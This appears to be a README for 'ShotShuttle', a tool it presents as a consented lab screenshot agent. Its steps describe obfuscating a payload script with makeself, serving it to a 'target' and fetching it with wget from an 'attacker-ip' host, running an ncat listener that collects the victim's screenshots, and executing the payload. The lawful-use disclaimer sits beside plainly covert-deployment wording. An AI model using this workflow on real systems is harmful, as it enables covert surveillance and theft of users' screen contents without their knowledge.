# ShotShuttle — Remote Screenshot Agent (for lab/consented use)

ShotShuttle is a lightweight background agent that periodically captures desktop screenshots (full screen or active window) on X11/Wayland and forwards them to a designated host. It auto-detects the best available capture backend (scrot, gnome-screenshot, spectacle, grim), generates unique filenames, and streams images over TCP with timeouts and simple retry logic. The agent can self-daemonize or run as a user service, with clear logs for easy auditing and troubleshooting. Configuration is straightforward—intervals, backends, and host/port—making it handy for demos, QA, and lab automation. ShotShuttle is designed for lawful, informed, consented environments; do not deploy it for covert monitoring or on systems you do not own.








### 1. Prepare a directory with your script and making archive:

We need to obfuscate the the original bash scrip 'payload.sh'. For this purpose, we will make the archive 'payload_obf.sh'. You must have the tool 'Makeself' installed to make the archive.

```bash
mkdir -p ~/test_obf
cp /path/to/payload.sh ~/test_obf/
makeself ~/test_obf payload_obf.sh "My test archive" ./payload.sh
```

### 2. Deliver payload:

Now you have the 'payload_obf.sh' file. Deliver 'payload_obf.sh' and 'auto_command.sh' to target using python http server.

```bash
python3 -m http.server
```
On target get the file using 'wget' command.

```bash
wget http://attacker-ip:port/file-name
```


### 3. Setup a listener:

Use the following command:

```bash
ncat -lk 9001 --sh-exec 'dir="$HOME/incoming-shots"; ts="$(date +%Y%m%d_%H%M%S)"; f="$(mktemp "$dir/shot_${ts}_XXXXXX.png")"; cat > "$f"; echo "Saved: $f" >&2'
```
Note: Make sure you have directory '$HOME/incoming-shots'. 


### 4. Payload execution:

Make sure to give executable permission to both files with command:

```bash
chmod +x filename
```
Run the 'auto_command' file.

```bash
./auto_command
```

